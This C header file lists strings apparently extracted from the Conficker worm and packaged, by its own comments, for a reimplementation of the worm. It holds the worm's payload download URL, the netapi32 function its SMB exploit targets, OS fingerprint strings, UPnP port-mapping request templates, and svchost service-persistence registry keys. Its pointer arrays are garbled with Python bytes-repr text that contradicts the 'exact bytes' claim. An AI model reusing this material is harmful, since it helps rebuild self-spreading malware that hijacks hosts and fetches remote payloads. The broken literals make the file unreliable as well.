/* Auto-generated: EXACT byte-for-byte strings recovered from the worm (stage 3). */
/* Every literal below is copied verbatim from the unpacked Conficker image. */
#ifndef KIDO_STRINGS_H
#define KIDO_STRINGS_H
#include <stdint.h>

/* ---- ASCII strings ---- */
static const char S_IP_LOOKUP1[] = "http://www.getmyip.org"; // RVA 0x138C
static const char S_IP_LOOKUP2[] = "http://getmyip.co.uk"; // RVA 0x13A4
static const char S_IP_LOOKUP3[] = "http://checkip.dyndns.org"; // RVA 0x13BC
static const char S_SELF_URL[] = "http://%d.%d.%d.%d:%d/%s"; // RVA 0x14BC
static const char S_IPC[] = "\\\\%s\\IPC$"; // RVA 0x14D8
static const char S_NCACN[] = "ncacn_np"; // RVA 0x1500
static const char S_PIPE_SRVSVC[] = "\\pipe\\srvsvc"; // RVA 0x151C
static const char S_PIPE_BROWSER[] = "\\pipe\\browser"; // RVA 0x154C
static const char S_SMB_NETBIOS[] = "D CKFDENECFDEFFCFGEFFCCACACACACACA"; // RVA 0x19C3
static const char S_NTLM[] = "NT LM 0.12"; // RVA 0x1A34
static const char S_LANMAN[] = "LANMAN"; // RVA 0x1A86
static const char S_OS_UNIX[] = "unix"; // RVA 0x1A90
static const char S_OS_WIN40[] = "windows 4.0"; // RVA 0x1A98
static const char S_OS_WIN50[] = "windows 5.0"; // RVA 0x1AA4
static const char S_OS_WIN51[] = "windows 5.1"; // RVA 0x1AB0
static const char S_OS_SP2[] = "service pack 2"; // RVA 0x1ABC
static const char S_OS_WS2003[] = "windows server 2003"; // RVA 0x1ACC
static const char S_OS_VISTA[] = "vista"; // RVA 0x1B00
static const char S_OS_SP[] = "service pack"; // RVA 0x1AE0
static const char S_OS_SP1[] = "service pack 1"; // RVA 0x1AF0
static const char S_HTTP_200[] = "HTTP/1.0 200 OK\r\nPragma: no-cache\r\nContent-Length: %u\r\nContent-Type: image/jpeg\r\n\r\n"; // RVA 0x1B18
static const char S_USER_AGENT[] = "\r\nuser-agent:"; // RVA 0x1B80
static const char S_GET_SLASH[] = "get /%s http/"; // RVA 0x1B98
static const char S_DATE_W3[] = "w3.org"; // RVA 0x18E0
static const char S_DATE_ASK[] = "ask.com"; // RVA 0x18E8
static const char S_DATE_MSN[] = "msn.com"; // RVA 0x18F0
static const char S_DATE_YAHOO[] = "yahoo.com"; // RVA 0x18F8
static const char S_DATE_GOOGLE[] = "google.com"; // RVA 0x1904
static const char S_DATE_BAIDU[] = "baidu.com"; // RVA 0x1910
static const char S_TLD_BIZ[] = ".biz"; // RVA 0x1888
static const char S_TLD_INFO[] = ".info"; // RVA 0x1890
static const char S_TLD_ORG[] = ".org"; // RVA 0x1898
static const char S_TLD_NET[] = ".net"; // RVA 0x18A0
static const char S_TLD_COM[] = ".com"; // RVA 0x18A8
static const char S_HTTP_WWW[] = "http://www.%s"; // RVA 0x1924
static const char S_TRAFFIC_EXE[] = "http://trafficconverter.biz/4vir/antispyware/loadadv.exe"; // RVA 0x195C
static const char S_TRAFFIC_HOST[] = "http://trafficconverter.biz"; // RVA 0x1998
static const char S_GEOIP[] = "http://www.maxmind.com/download/geoip/database/GeoIP.dat.gz"; // RVA 0x3E3C
static const char S_GET_HTTP11[] = "GET %s HTTP/1.1\r\nHost: %s:%d\r\nConnection: Close\r\n\r\n"; // RVA 0x61C0
static const char S_MSEARCH[] = "M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nST: %s\r\nMAN: \"ssdp:discover\"\r\nMX: 3\r\n\r\n"; // RVA 0x63A8
static const char S_LOC[] = "location"; // RVA 0x6460
static const char S_IGD[] = "urn:schemas-upnp-org:device:InternetGatewayDevice:1"; // RVA 0x6428
static const char S_ROOTDEV[] = "upnp:rootdevice"; // RVA 0x6418
static const char S_SOAPPOST[] = "POST %s HTTP/1.1\r\nHost: %s%s\r\nUser-Agent: POSIX, UPnP/1.0\r\nContent-Length: %d\r\nContent-Type: text/xml\r\nSOAPAction: \"%s\"\r\nConnection: Close\r\nCache-Control: no-cache\r\nPragma: no-cache\r\n\r\n"; // RVA 0x62D0
static const char S_CONTENTLEN[] = "content-length"; // RVA 0x6398
static const char S_WANPPP[] = "urn:schemas-upnp-org:service:WANPPPConnection:1"; // RVA 0x6200
static const char S_WANIP[] = "urn:schemas-upnp-org:service:WANIPConnection:1"; // RVA 0x6230
static const char S_WANCI[] = "urn:schemas-upnp-org:service:WANCommonInterfaceConfig:1"; // RVA 0x6260
static const char S_SCPDURL[] = "SCPDURL"; // RVA 0x6298
static const char S_EVTSUBURL[] = "eventSubURL"; // RVA 0x62A0
static const char S_CTRLURL[] = "controlURL"; // RVA 0x62AC
static const char S_SRVCETYPE[] = "serviceType"; // RVA 0x62B8
static const char S_URLBASE[] = "URLBase"; // RVA 0x62C4
static const char S_MCAST[] = "239.255.255.250"; // RVA 0x6620
static const char S_SOAP_ENV1[] = "<?xml version=\"1.0\"?>\r\n<s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><m:%s xmlns:m=\"%s\">"; // RVA 0x6498
static const char S_SOAP_ENV2[] = "<?xml version=\"1.0\"?>\r\n<s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><m:%s xmlns:m=\"%s\"></m:%s></s:Body></s:Envelo"; // RVA 0x6548
static const char S_NETPW[] = "NetpwPathCanonicalize"; // RVA 0x15BC
static const char S_NETAPI32[] = "netapi32.dll"; // RVA 0x15D4
static const char S_SERVICES_EXE[] = "services.exe"; // RVA 0x604
static const char S_NLS[] = "Microsoft\\Windows\\CurrentVersion\\Nls"; // RVA 0x614
static const char S_SHAREDACCESS[] = "SharedAccess"; // RVA 0x644
static const char S_RESETSR[] = "ResetSR"; // RVA 0x684
static const char S_SRCLIENT[] = "srclient.dll"; // RVA 0x68C

/* ---- UTF-16LE (wide) strings ---- */
static const uint8_t W_SVCHOST[] = {
    0x53, 0x00, 0x4F, 0x00, 0x46, 0x00, 0x54, 0x00, 0x57, 0x00, 0x41, 0x00, 0x52, 0x00, 0x45, 0x00,
    0x5C, 0x00, 0x4D, 0x00, 0x69, 0x00, 0x63, 0x00, 0x72, 0x00, 0x6F, 0x00, 0x73, 0x00, 0x6F, 0x00,
    0x66, 0x00, 0x74, 0x00, 0x5C, 0x00, 0x57, 0x00, 0x69, 0x00, 0x6E, 0x00, 0x64, 0x00, 0x6F, 0x00,
    0x77, 0x00, 0x73, 0x00, 0x20, 0x00, 0x4E, 0x00, 0x54, 0x00, 0x5C, 0x00, 0x43, 0x00, 0x75, 0x00,
    0x72, 0x00, 0x72, 0x00, 0x65, 0x00, 0x6E, 0x00, 0x74, 0x00, 0x56, 0x00, 0x65, 0x00, 0x72, 0x00,
    0x73, 0x00, 0x69, 0x00, 0x6F, 0x00, 0x6E, 0x00, 0x5C, 0x00, 0x53, 0x00, 0x76, 0x00, 0x63, 0x00,
    0x48, 0x00, 0x6F, 0x00, 0x73, 0x00, 0x74, 0x00,
}; // wide "SOFTWARE\Microsoft\Windows NT\CurrentVersion\SvcHost"  file 0xAB0
static const uint8_t W_SVCHOST_IMG[] = {
    0x73, 0x00, 0x79, 0x00, 0x73, 0x00, 0x74, 0x00, 0x65, 0x00, 0x6D, 0x00, 0x33, 0x00, 0x32, 0x00,
    0x5C, 0x00, 0x73, 0x00, 0x76, 0x00, 0x63, 0x00, 0x68, 0x00, 0x6F, 0x00, 0x73, 0x00, 0x74, 0x00,
    0x2E, 0x00, 0x65, 0x00, 0x78, 0x00, 0x65, 0x00, 0x20, 0x00, 0x2D, 0x00, 0x6B, 0x00, 0x20, 0x00,
}; // wide "system32\svchost.exe -k "  file 0xC42
static const uint8_t W_NETSVCS[] = {
    0x6E, 0x00, 0x65, 0x00, 0x74, 0x00, 0x73, 0x00, 0x76, 0x00, 0x63, 0x00, 0x73, 0x00,
}; // wide "netsvcs"  file 0xC78
static const uint8_t W_SVC_BASE[] = {
    0x43, 0x00, 0x75, 0x00, 0x72, 0x00, 0x72, 0x00, 0x65, 0x00, 0x6E, 0x00, 0x74, 0x00, 0x43, 0x00,
    0x6F, 0x00, 0x6E, 0x00, 0x74, 0x00, 0x72, 0x00, 0x6F, 0x00, 0x6C, 0x00, 0x53, 0x00, 0x65, 0x00,
    0x74, 0x00, 0x5C, 0x00, 0x53, 0x00, 0x65, 0x00, 0x72, 0x00, 0x76, 0x00, 0x69, 0x00, 0x63, 0x00,
    0x65, 0x00, 0x73, 0x00, 0x5C, 0x00,
}; // wide "CurrentControlSet\Services\"  file 0xBEE
static const uint8_t W_SERVICE_DLL[] = {
    0x53, 0x00, 0x65, 0x00, 0x72, 0x00, 0x76, 0x00, 0x69, 0x00, 0x63, 0x00, 0x65, 0x00, 0x44, 0x00,
    0x6C, 0x00, 0x6C, 0x00,
}; // wide "ServiceDll"  file 0xB1C
static const uint8_t W_IMAGE_PATH[] = {
    0x49, 0x00, 0x6D, 0x00, 0x61, 0x00, 0x67, 0x00, 0x65, 0x00, 0x50, 0x00, 0x61, 0x00, 0x74, 0x00,
    0x68, 0x00,
}; // wide "ImagePath"  file 0xB7C
static const uint8_t W_OBJECT_NAME[] = {
    0x4F, 0x00, 0x62, 0x00, 0x6A, 0x00, 0x65, 0x00, 0x63, 0x00, 0x74, 0x00, 0x4E, 0x00, 0x61, 0x00,
    0x6D, 0x00, 0x65, 0x00,
}; // wide "ObjectName"  file 0xB4C
static const uint8_t W_LOCAL_SYSTEM[] = {
    0x4C, 0x00, 0x6F, 0x00, 0x63, 0x00, 0x61, 0x00, 0x6C, 0x00, 0x53, 0x00, 0x79, 0x00, 0x73, 0x00,
    0x74, 0x00, 0x65, 0x00, 0x6D, 0x00,
}; // wide "LocalSystem"  file 0xB64
static const uint8_t W_DISPLAY_NAME[] = {
    0x44, 0x00, 0x69, 0x00, 0x73, 0x00, 0x70, 0x00, 0x6C, 0x00, 0x61, 0x00, 0x79, 0x00, 0x4E, 0x00,
    0x61, 0x00, 0x6D, 0x00, 0x65, 0x00,
}; // wide "DisplayName"  file 0xBC4
static const uint8_t W_ERROR_CONTROL[] = {
    0x45, 0x00, 0x72, 0x00, 0x72, 0x00, 0x6F, 0x00, 0x72, 0x00, 0x43, 0x00, 0x6F, 0x00, 0x6E, 0x00,
    0x74, 0x00, 0x72, 0x00, 0x6F, 0x00, 0x6C, 0x00,
}; // wide "ErrorControl"  file 0xB90
static const uint8_t W_PARAMETERS[] = {
    0x50, 0x00, 0x61, 0x00, 0x72, 0x00, 0x61, 0x00, 0x6D, 0x00, 0x65, 0x00, 0x74, 0x00, 0x65, 0x00,
    0x72, 0x00, 0x73, 0x00,
}; // wide "Parameters"  file 0xB34
static const uint8_t W_START[] = {
    0x53, 0x00, 0x74, 0x00, 0x61, 0x00, 0x72, 0x00, 0x74, 0x00,
}; // wide "Start"  file 0xBAC
static const uint8_t W_TYPE[] = {
    0x54, 0x00, 0x79, 0x00, 0x70, 0x00, 0x65, 0x00,
}; // wide "Type"  file 0xBB8

/* ---- pointer arrays (fixed order as in the worm) ---- */
static const char* const g_tld[] = { "b'.biz'", "b'.info'", "b'.org'", "b'.net'", "b'.com'", 0 };
static const char* const g_ip_sites[] = { "b'http://www.getmyip.org'", "b'http://getmyip.co.uk'", "b'http://checkip.dyndns.org'", 0 };
static const char* const g_date_sites[] = { "b'w3.org'", "b'ask.com'", "b'msn.com'", "b'yahoo.com'", "b'google.com'", "b'baidu.com'", 0 };
#define KIDO_TLD_COUNT 5
#define KIDO_IP_SITES 3
#define KIDO_DATE_SITES 6

/* ---- extra literals used by the reimplementation (exact bytes) ---- */
static const char S_KERN32[] = "kernel32.dll";
static const char S_MUTEX_FMT[] = "Global\\%u-%u";


static const char S_IP_ADDRESS[] = "ip address";
static const char S_EVT_N[] = "n%08x%08x%08x";
static const char S_EVT_W[] = "w%08x%08x%08x";


static const char S_DATE_SEARCH[] = "http://%s/search?q=%d&aq=%d";

#endif
